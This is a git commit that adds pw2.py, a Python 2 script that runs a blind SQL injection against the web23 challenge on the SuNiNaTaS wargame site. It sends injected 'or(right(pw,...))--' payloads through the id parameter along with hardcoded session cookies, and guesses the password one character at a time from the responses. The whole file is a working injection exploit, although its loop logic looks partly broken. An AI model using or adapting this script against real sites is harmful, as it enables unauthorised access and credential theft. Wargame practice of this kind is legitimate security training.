6664e6cc16a3fa25cdcb74509e6dfd9f5a75bc3a
KeLibrary <wpx@daum.net>
2016-12-29 21:42:21 +0900

    Create pw2.py

---
+++ pw2.py
@@ -0,0 +1,30 @@
+import urllib
+import urllib2
+import sys
+import time
+
+string = " abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$^&*()-_+"
+key = ""
+
+for j in range(len(string)):
+	payload = "'or(right(pw,4)='"+string[j]+"qli')--"
+	payload = urllib.quote(payload)
+	url = "http://suninatas.com/Part_one/web23/web23.asp?id="+payload+"&pw=1"
+
+	print url
+
+	opener = urllib2.build_opener(urllib2.HTTPHandler)
+	request = urllib2.Request(url)
+	request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36')
+	request.add_header('Cookie', 'ASPSESSIONIDQSCSBBRT=ILIHJDADLBIDDOPOEHNPKHJB; auth%5Fkey=65038b0559e459420aa2d23093d01e4a; ASPSESSIONIDSSCSBAQS=EBPGPBICILNOGEFLFIBMANEM')
+	request.get_method = lambda:'GET'
+	data = opener.open(request)
+	data = data.read()
+
+	if "OK" in data:
+		key += string[j]
+		print "[*] Find Password!! Password is ["+key+"]"
+	else:
+		print "[-] Fail!"
+	time.sleep(0.1)
+print "[*] Password is ["+key+"]"
